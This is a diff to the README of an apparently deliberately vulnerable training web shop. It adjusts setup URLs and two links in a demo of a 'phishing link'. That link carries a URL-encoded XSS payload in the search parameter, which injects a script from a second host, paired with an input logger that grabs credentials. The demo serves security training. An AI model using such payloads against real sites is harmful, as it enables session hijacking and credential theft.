@@ -98,7 +98,7 @@ overview please visit the official project page:
    clone [your own fork](https://github.com/bkimminich/juice-shop/fork)
    of the repository)
 3. Run `cd vagrant && vagrant up`
-4. Browse to [192.168.33.10](http://192.168.33.10)
+4. Browse to [192.168.33.10:3000](http://192.168.33.10:3000)
 
 > There is a very convenient Vagrant box available at
 > <https://app.vagrantup.com/commjoen/boxes/trainingbox> (:microscope:)
@@ -203,9 +203,9 @@ can download this
 [docker-compose](https://raw.githubusercontent.com/wurstbrot/shake-logger/master/docker-compose.yml)-file
 and run `docker-compose up` to start the juice-shop and the
 shake-logger. Assume you received and (of course) clicked
-[this inconspicuous phishing link](http://192.168.33.10:3000/#/search?q=%3Cimg+src%3Dx+onerror%3D%27var+js%3Ddocument.createElement%28%22script%22%29%3Bjs.type+%3D+%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar+hash%3Dwindow.location.hash%3Bwindow.location.hash%3Dhash.substr%280%2C8%29%3B%27%2F%3Eapple)
+[this inconspicuous phishing link](localhost:3000/#/search?q=%3Cimg+src%3Dx+onerror%3D%27var+js%3Ddocument.createElement%28%22script%22%29%3Bjs.type+%3D+%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar+hash%3Dwindow.location.hash%3Bwindow.location.hash%3Dhash.substr%280%2C8%29%3B%27%2F%3Eapple)
 and login. Apart from the visual/audible effect, the attacker also
-installed [an input logger](http://192.168.33.10:8080/logger.php) to grab
+installed [an input logger](localhost:8080/logger.php) to grab
 credentials! This could easily run on a 3rd party server in real life!
 
 > You can also find a recording of this attack in action on YouTube:
